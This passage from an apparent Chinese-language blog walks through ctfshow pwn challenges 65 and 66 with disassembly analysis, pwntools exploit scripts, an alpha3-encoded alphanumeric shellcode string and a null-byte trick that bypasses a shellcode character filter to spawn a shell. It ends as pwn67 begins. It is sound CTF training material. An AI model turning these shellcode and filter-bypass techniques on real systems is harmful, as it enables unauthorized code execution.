<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28114</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 109</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Some different!</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn65"><a href="#pwn65" class="headerlink" title="pwn65"></a>pwn65</h2><p>Hint：你是一个好人</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位程序，开启PIE与完全开启RELRO 有RWX: Has RWX segments </p>
<p>IDA查看main函数（无法反编译，看汇编代码）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001155 buf             = byte ptr -410h </span><br><span class="line">#buf=0x410</span><br><span class="line"></span><br><span class="line">.text:0000000000001182                 mov     edx, 400h       ; nbytes</span><br><span class="line">.text:0000000000001187                 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000000118A                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000000118F                 mov     eax, 0</span><br><span class="line">.text:0000000000001194                 call    _read</span><br><span class="line">#read(0,buf,0x400)</span><br><span class="line"></span><br><span class="line">.text:0000000000001199    mov     [rbp+var_8], eax  ; 把 eax 的值存到栈变量 var_8 中</span><br><span class="line">.text:000000000000119C    cmp     [rbp+var_8], 0    ; 比较 var_8 和 0</span><br><span class="line">.text:00000000000011A0    jg      short loc_11AC    ; 如果 var_8 &gt; 0，则跳转到 loc_11AC（判断输入长度）</span><br><span class="line">.text:00000000000011A2    mov     eax, 0            ; 否则（var_8 ≤ 0），将 eax 设为 0</span><br><span class="line">.text:00000000000011A7    jmp     locret_1254       ; 无论如何，最终跳转到 locret_1254</span><br></pre></td></tr></table></figure>

<p>要让程序继续执行下去，得跳转到loc_11AC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011AC loc_11AC:                               ; CODE XREF: main+4B↑j</span><br><span class="line">.text:00000000000011AC                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000000011B3                 jmp     loc_123A</span><br><span class="line">#将栈上的变量 var_4（位于 rbp - 4 处，4 字节大小）赋值为 0,无条件跳转到 loc_123A </span><br></pre></td></tr></table></figure>

<p>loc_123A：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000123A loc_123A:                               ; CODE XREF: main+5E↑j</span><br><span class="line">.text:000000000000123A                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000000123D                 cmp     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000001240                 jl      loc_11B8</span><br><span class="line">.text:0000000000001246                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000000124D                 call    rax</span><br><span class="line">.text:000000000000124F                 mov     eax, 0</span><br><span class="line">#如果 var_4 &lt; var_8[即0&lt;输入字符串长度]（jl = jump if less than），则跳转到 loc_11B8 标签处,否则获取 buf 的地址 → 调用 buf 中的内容 → 设置返回值 0【字符串地址去执行，可以写入shellcode】</span><br></pre></td></tr></table></figure>

<p>loc_11B8【用于验证缓冲区中的字符是否在 <strong>小写字母 <code>a-z</code> 范围内</strong>】:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011B8 loc_11B8:                               ; CODE XREF: main+EB↓j</span><br><span class="line">.text:00000000000011B8                 mov     eax, [rbp+var_4]</span><br><span class="line">#将 var_4 的值（通常是索引计数器）加载到 eax【作为缓冲区 buf 的索引，用于遍历字符】</span><br><span class="line">.text:00000000000011BB                 cdqe</span><br><span class="line">#将eax（32位）符号扩展为 rax（64位）【因为后续需要用rax作为内存偏移，确保负数索引正确转换】</span><br><span class="line">.text:00000000000011BD                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">#从 buf[var_4] 位置读取一个字节（就是读取第 var_4 个字符），并零扩展到 eax【rbp + buf 是缓冲区基址，+ rax 是偏移量（即 var_4）】</span><br><span class="line">.text:00000000000011C5                 cmp     al, 60h ; &#x27;`&#x27;</span><br><span class="line">.text:00000000000011C7                 jle     short loc_11DA</span><br><span class="line">#检查字符是否 ≤ 60h（即反引号 `）若是，则跳转到 loc_11DA（处理非法字符）。</span><br><span class="line">.text:00000000000011C9                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011CC                 cdqe</span><br><span class="line">.text:00000000000011CE                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011D6                 cmp     al, 7Ah ; &#x27;z&#x27;</span><br><span class="line">.text:00000000000011D8                 jle     short loc_1236</span><br><span class="line">#检查字符是否 ≤ 7Ah（即小写字母 z）。若是（字符在 a-z 范围内），跳转到 loc_1236（处理合法字符）。</span><br></pre></td></tr></table></figure>

<p>loc_11DA【检查字符是否属于 <strong>大写字母 <code>A-Z</code> 范围</strong>】：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011DA loc_11DA:                               ; CODE XREF: main+72↑j</span><br><span class="line">.text:00000000000011DA                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011DD                 cdqe</span><br><span class="line">.text:00000000000011DF                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011E7                 cmp     al, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00000000000011E9                 jle     short loc_11FC</span><br><span class="line">.text:00000000000011EB                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011EE                 cdqe</span><br><span class="line">.text:00000000000011F0                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011F8                 cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">.text:00000000000011FA                 jle     short loc_1236</span><br></pre></td></tr></table></figure>

<p>loc_11FC【检查字符是否属于<strong>数字 <code>0-9</code> 或特殊符号 <code>+-/\*</code> 等</strong>】：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011FC loc_11FC:                               ; CODE XREF: main+94↑j</span><br><span class="line">.text:00000000000011FC                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011FF                 cdqe</span><br><span class="line">.text:0000000000001201                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:0000000000001209                 cmp     al, 2Fh ; &#x27;/&#x27;</span><br><span class="line">.text:000000000000120B                 jle     short loc_121E</span><br><span class="line">.text:000000000000120D                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000001210                 cdqe</span><br><span class="line">.text:0000000000001212                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:000000000000121A                 cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">.text:000000000000121C                 jle     short loc_1236</span><br><span class="line">#如果小于等于 0x2F，跳到 loc_121E</span><br><span class="line">#如果小于等于 0x5A，还是跳到 loc_1236</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000121E loc_121E:                               ; CODE XREF: main+B6↑j</span><br><span class="line">.text:000000000000121E                 lea     rdi, format     ; &quot;Good,but not right&quot;</span><br><span class="line">.text:0000000000001225                 mov     eax, 0</span><br><span class="line">.text:000000000000122A                 call    _printf</span><br><span class="line">.text:000000000000122F                 mov     eax, 0</span><br><span class="line">.text:0000000000001234                 jmp     short locret_1254</span><br><span class="line">.text:0000000000001236 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001236</span><br><span class="line">.text:0000000000001236 loc_1236:                               ; CODE XREF: main+83↑j</span><br><span class="line">.text:0000000000001236                                         ; main+A5↑j ...</span><br><span class="line">.text:0000000000001236                 add     [rbp+var_4], 1</span><br><span class="line">.text:000000000000123A</span><br><span class="line"></span><br><span class="line">.text:0000000000001254</span><br><span class="line">.text:0000000000001254 locret_1254:                            ; CODE XREF: main+52↑j</span><br><span class="line">.text:0000000000001254                                         ; main+DF↑j</span><br><span class="line">.text:0000000000001254                 leave</span><br><span class="line">.text:0000000000001255                 retn</span><br><span class="line">.text:0000000000001255 ; &#125; // starts at 1155</span><br><span class="line">.text:0000000000001255 main            endp</span><br></pre></td></tr></table></figure>

<p>总结：输入的字符大致限定在了(60,74)||(2f,5a)两个范围里，都是可打印字符，但是我们的 shellcode 实际上是会包含一些不可打印字符的。string.printable，就是可见字符shellcode。因此这里需要借助到一个工具：alpha3【<code>git clone https://github.com/TaQini/alpha3.git</code>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> nano exp.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode&#x27;</span>, <span class="string">&#x27;bw&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(shellcode)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br></pre></td></tr></table></figure>

<p>当前目录下会生成一个名为 <code>shellcode</code> 的二进制文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxd shellcode  <span class="comment"># 以十六进制形式查看</span></span><br><span class="line">00000000: 6a68 48b8 2f62 696e 2f2f 2f73 5048 89e7  jhH./bin///sPH..</span><br><span class="line">00000010: 6872 6901 0181 3424 0101 0101 31f6 566a  hri...4$....1.Vj</span><br><span class="line">00000020: 085e 4801 e656 4889 e631 d26a 3b58 0f05  .^H..VH..1.j;X..</span><br><span class="line">$ <span class="built_in">cat</span> shellcode</span><br><span class="line">jhH¸/bin///sPH槲i4$^H啈䲒j;X</span><br></pre></td></tr></table></figure>

<p>使用pwntools生成一个shellcode，没法直接输出，有乱码，将shellcode重定向到一个文件中 切换到alpha3目录中，使用alpha3生成string.printable</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> alpha3</span><br><span class="line">root@pwn_challenge:/CTFshow_pwn/alpha3$ python2 ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;shellcode&quot;</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>

<p><code>python3不行，得用Python2【24.04已经没有Python2了，用20.04的】</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Input you Shellcode\n&#x27;</span>,shellcode) <span class="comment">#sendline会使用到换行符，这个也是不可打印字符，要使用send</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 239</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn66"><a href="#pwn66" class="headerlink" title="pwn66"></a>pwn66</h2><p><code>原题来自：starctf_2019_babyshell</code></p>
<p>Hint：简单的shellcode？不对劲，十分得有十二分的不对劲</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位关闭栈保护与PIE</p>
<p>从运行的程序的hint以及题目描述中我们能看到与shellcode有关，但是是有限制的shellcode</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">0x1000u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your shellcode is :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; ERROR !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))buf)(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf存在溢出点，往buf里写入shellcode，然后程序会执行shellcod</p>
<p>但是有一个check函数，跟进查看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(_BYTE *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = &amp;unk_400F20; *i &amp;&amp; *i != *buf; ++i ) </span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*i )  <span class="comment">//  *i == 0，即字符集遍历结束（遇到 &#x27;\0&#x27;）</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会对我们输入的shellcode进行检查，我们输入的shellcode的每一位字符要在unk_400F20中，检查的时候*i&#x3D;&#x3D;0会退出，<code>可以使用\x00来绕过</code>。</p>
<p>继续跟进unk_400F20：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:0000000000400F20 unk_400F20      db  5Ah ; Z             ; DATA XREF: check+8↑o</span><br><span class="line">.rodata:0000000000400F21                 db  5Ah ; Z</span><br><span class="line">.rodata:0000000000400F22                 db  4Ah ; J</span><br><span class="line">.rodata:0000000000400F23                 db  20h</span><br><span class="line">.rodata:0000000000400F24                 db  6Ch ; l</span><br><span class="line">.rodata:0000000000400F25                 db  6Fh ; o</span><br><span class="line">.rodata:0000000000400F26                 db  76h ; v</span><br><span class="line">.rodata:0000000000400F27                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F28                 db  73h ; s</span><br><span class="line">.rodata:0000000000400F29                 db  20h</span><br><span class="line">.rodata:0000000000400F2A                 db  73h ; s</span><br><span class="line">.rodata:0000000000400F2B                 db  68h ; h</span><br><span class="line">.rodata:0000000000400F2C                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F2D                 db  6Ch ; l</span><br><span class="line">.rodata:0000000000400F2E                 db  6Ch ; l</span><br><span class="line">.rodata:0000000000400F2F                 db  5Fh ; _</span><br><span class="line">.rodata:0000000000400F30                 db  63h ; c</span><br><span class="line">.rodata:0000000000400F31                 db  6Fh ; o</span><br><span class="line">.rodata:0000000000400F32                 db  64h ; d</span><br><span class="line">.rodata:0000000000400F33                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F34                 db  2Ch ; ,</span><br><span class="line">.rodata:0000000000400F35                 db  61h ; a</span><br><span class="line">.rodata:0000000000400F36                 db  6Eh ; n</span><br><span class="line">.rodata:0000000000400F37                 db  64h ; d</span><br><span class="line">.rodata:0000000000400F38                 db  20h</span><br><span class="line">.rodata:0000000000400F39                 db  68h ; h</span><br><span class="line">.rodata:0000000000400F3A                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F3B                 db  72h ; r</span><br><span class="line">.rodata:0000000000400F3C                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F3D                 db  20h</span><br><span class="line">.rodata:0000000000400F3E                 db  69h ; i</span><br><span class="line">.rodata:0000000000400F3F                 db  73h ; s</span><br><span class="line">.rodata:0000000000400F40                 db  20h</span><br><span class="line">.rodata:0000000000400F41                 db  61h ; a</span><br><span class="line">.rodata:0000000000400F42                 db  20h</span><br><span class="line">.rodata:0000000000400F43                 db  67h ; g</span><br><span class="line">.rodata:0000000000400F44                 db  69h ; i</span><br><span class="line">.rodata:0000000000400F45                 db  66h ; f</span><br><span class="line">.rodata:0000000000400F46                 db  74h ; t</span><br><span class="line">.rodata:0000000000400F47                 db  3Ah ; :</span><br><span class="line">.rodata:0000000000400F48                 db  0Fh</span><br><span class="line">.rodata:0000000000400F49                 db    5</span><br><span class="line">.rodata:0000000000400F4A                 db  20h</span><br><span class="line">.rodata:0000000000400F4B                 db  65h ; e</span><br><span class="line">.rodata:0000000000400F4C                 db  6Eh ; n</span><br><span class="line">.rodata:0000000000400F4D                 db  6Ah ; j</span><br><span class="line">.rodata:0000000000400F4E                 db  6Fh ; o</span><br><span class="line">.rodata:0000000000400F4F                 db  79h ; y</span><br><span class="line">.rodata:0000000000400F50                 db  20h</span><br><span class="line">.rodata:0000000000400F51                 db  69h ; i</span><br><span class="line">.rodata:0000000000400F52                 db  74h ; t</span><br><span class="line">.rodata:0000000000400F53                 db  21h ; !</span><br><span class="line">.rodata:0000000000400F54                 db  0Ah</span><br><span class="line">.rodata:0000000000400F55                 db    0</span><br></pre></td></tr></table></figure>

<p>‘ZZJ loves shell_code,and here is a gift:’,0Fh,5,’ enjoy it!’,0Ah,0</p>
<p>那么只需要通过\x00绕过检查， 同时执行我们输入的shellcode就好，\x00B后面加上一个字符，对应一个汇编语句。所以可以通过\x00B\x22、\x00B\x00 、\x00J\x00、\x00RZ、\x00\x42\x22、\x00\x4a\x00等等来绕过那个检查</p>
<p>这个题一种解法是利用可见字符写shellcode 另一种就是绕过它 while(*a),也就是一般写代码的路，遇到\x00就不校验了，所以如果shellcode以\x00开头， 那是不是就解决了？ 先找一下汇编指以‘\x00’开头的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#提供 p8()（将整数转换为单字节）和 disasm()（反汇编机器码）函数</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> * <span class="comment">#提供 product() 函数，用于生成所有可能的字节组合</span></span><br><span class="line"><span class="keyword">import</span> re <span class="comment">#用于正则表达式匹配，过滤包含内存引用的指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[p8(k) for k in range(256)] 生成 0x00 到 0xFF 的所有单字节。</span></span><br><span class="line"><span class="comment">#product(..., repeat=i) 生成这些字节的所有排列组合（如 (0x00), (0x01), ..., (0xFF, 0xFF)）</span></span><br><span class="line"><span class="comment">#每个测试序列以 \x00 开头，后接 1~2 个任意字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">        payload=<span class="string">b&quot;\x00&quot;</span> +<span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">        res=disasm(payload) <span class="comment">#将机器码转换为汇编指令</span></span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">        	res != <span class="string">&quot;\t\t...&quot;</span> <span class="comment">#排除无法反汇编的空指令</span></span><br><span class="line">        	<span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>,res) <span class="comment">#排除包含内存引用的指令</span></span><br><span class="line">            <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res <span class="comment">#排除非标准指令</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="comment">#input()</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">        ...</span><br><span class="line">   0:   00 c0                   add    al, al</span><br><span class="line">   0:   00 c1                   add    cl, al</span><br><span class="line">   0:   00 c2                   add    dl, al</span><br><span class="line">   0:   00 c3                   add    bl, al</span><br><span class="line">   0:   00 c4                   add    ah, al</span><br><span class="line">   0:   00 c5                   add    ch, al</span><br><span class="line">   0:   00 c6                   add    dh, al</span><br><span class="line">   0:   00 c7                   add    bh, al</span><br><span class="line">   0:   00 c8                   add    al, cl</span><br><span class="line">   0:   00 c9                   add    cl, cl</span><br><span class="line">   0:   00 ca                   add    dl, cl</span><br><span class="line">   0:   00 cb                   add    bl, cl</span><br><span class="line">   0:   00 cc                   add    ah, cl</span><br><span class="line">   0:   00 <span class="built_in">cd</span>                   add    ch, cl</span><br><span class="line">   0:   00 ce                   add    dh, cl</span><br><span class="line">   0:   00 cf                   add    bh, cl</span><br><span class="line">   0:   00 d0                   add    al, dl</span><br><span class="line">   0:   00 d1                   add    cl, dl</span><br><span class="line">   0:   00 d2                   add    dl, dl</span><br><span class="line">   0:   00 d3                   add    bl, dl</span><br><span class="line">   0:   00 d4                   add    ah, dl</span><br><span class="line">   0:   00 d5                   add    ch, dl</span><br><span class="line">   0:   00 d6                   add    dh, dl</span><br><span class="line">   0:   00 d7                   add    bh, dl</span><br><span class="line">   0:   00 d8                   add    al, bl</span><br><span class="line">   0:   00 d9                   add    cl, bl</span><br><span class="line">   0:   00 da                   add    dl, bl</span><br><span class="line">   0:   00 db                   add    bl, bl</span><br><span class="line">   0:   00 dc                   add    ah, bl</span><br><span class="line">   0:   00 <span class="built_in">dd</span>                   add    ch, bl</span><br><span class="line">   0:   00 de                   add    dh, bl</span><br><span class="line">   0:   00 <span class="built_in">df</span>                   add    bh, bl</span><br><span class="line">   0:   00 e0                   add    al, ah</span><br><span class="line">   0:   00 e1                   add    cl, ah</span><br><span class="line">   0:   00 e2                   add    dl, ah</span><br><span class="line">   0:   00 e3                   add    bl, ah</span><br><span class="line">   0:   00 e4                   add    ah, ah</span><br><span class="line">   0:   00 e5                   add    ch, ah</span><br><span class="line">   0:   00 e6                   add    dh, ah</span><br><span class="line">   0:   00 e7                   add    bh, ah</span><br><span class="line">   0:   00 e8                   add    al, ch</span><br><span class="line">   0:   00 e9                   add    cl, ch</span><br><span class="line">   0:   00 ea                   add    dl, ch</span><br><span class="line">   0:   00 eb                   add    bl, ch</span><br><span class="line">   0:   00 ec                   add    ah, ch</span><br><span class="line">   0:   00 ed                   add    ch, ch</span><br><span class="line">   0:   00 ee                   add    dh, ch</span><br><span class="line">   0:   00 ef                   add    bh, ch</span><br><span class="line">   0:   00 f0                   add    al, dh</span><br><span class="line">   0:   00 f1                   add    cl, dh</span><br><span class="line">   0:   00 f2                   add    dl, dh</span><br><span class="line">   0:   00 f3                   add    bl, dh</span><br><span class="line">   0:   00 f4                   add    ah, dh</span><br><span class="line">   0:   00 f5                   add    ch, dh</span><br><span class="line">   0:   00 f6                   add    dh, dh</span><br><span class="line">   0:   00 f7                   add    bh, dh</span><br><span class="line">   0:   00 f8                   add    al, bh</span><br><span class="line">   0:   00 f9                   add    cl, bh</span><br><span class="line">   0:   00 fa                   add    dl, bh</span><br><span class="line">   0:   00 fb                   add    bl, bh</span><br><span class="line">   0:   00 <span class="built_in">fc</span>                   add    ah, bh</span><br><span class="line">   0:   00 fd                   add    ch, bh</span><br><span class="line">   0:   00 fe                   add    dh, bh</span><br><span class="line">   0:   00 ff                   add    bh, bh</span><br><span class="line"><span class="comment">#省略，太多了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28128)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 22221</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Restricted shellcode !</span><br><span class="line">    * *************************************</span><br><span class="line">Your shellcode is :</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn67（好难，艰难版）"><a href="#pwn67（好难，艰难版）" class="headerlink" title="pwn67（好难，艰难版）"></a>pwn67（好难，艰难版）</h2><p>Hint：32bit nop sled</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭NX PIE 有可读可写可执行的段</p>
<p>因此我们可以从堆栈中执行。向程序提供 shellcode 很容易，因为它只要求输入。现在我们只需要找到一种方法来跳转到我们的 shellcode。</p>
<p>IDA查看main函数：</p>
